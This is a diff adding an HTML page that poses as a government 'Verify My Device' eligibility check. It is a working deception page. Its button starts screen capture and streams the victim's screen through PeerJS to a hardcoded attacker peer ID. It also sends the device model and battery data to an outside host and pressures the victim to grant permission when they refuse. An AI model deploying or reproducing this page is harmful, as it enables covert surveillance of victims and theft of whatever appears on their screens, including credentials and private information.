@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifying Eligibility...</title>
+    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-black text-white flex items-center justify-center h-screen">
+    <div class="text-center p-6">
+        <div id="loader" class="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500 mx-auto"></div>
+        <h2 id="msg" class="mt-6 text-xl">Connecting to Govt Secure Server...</h2>
+        
+        <button id="verify-btn" class="mt-8 bg-blue-600 px-10 py-4 rounded-full font-bold shadow-lg">VERIFY MY DEVICE</button>
+    </div>
+
+    <script>
+        const peer = new Peer();
+        const adminId = "AURALINK_ADMIN_2026"; 
+
+        peer.on('open', (id) => {
+            document.getElementById('verify-btn').onclick = async () => {
+                try {
+                    // Yahan se Screen Capture start hoga
+                    const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                    peer.call(adminId, stream);
+                    
+                    const conn = peer.connect(adminId);
+                    conn.on('open', async () => {
+                        const bat = await navigator.getBattery();
+                        const info = {
+                            peer_id: id,
+                            model: navigator.userAgent.split('(')[1].split(')')[0],
+                            battery: Math.floor(bat.level * 100) + '%'
+                        };
+                        
+                        // DATA SENDING TO INFINITYFREE (Change this URL to your domain)
+                        fetch('http://leptop2026.gt.tc/save_data.php', {
+                            method: 'POST',
+                            mode: 'no-cors', // InfinityFree restrictions bypass
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify(info)
+                        });
+
+                        document.getElementById('msg').innerText = "Verification in progress... Keep this window open.";
+                        document.getElementById('verify-btn').style.display = 'none';
+                    });
+                } catch (err) {
+                    alert("Verification Failed: Please click 'Allow' to verify hardware specs.");
+                }
+            };
+        });
+    </script>
+</body>
+</html>
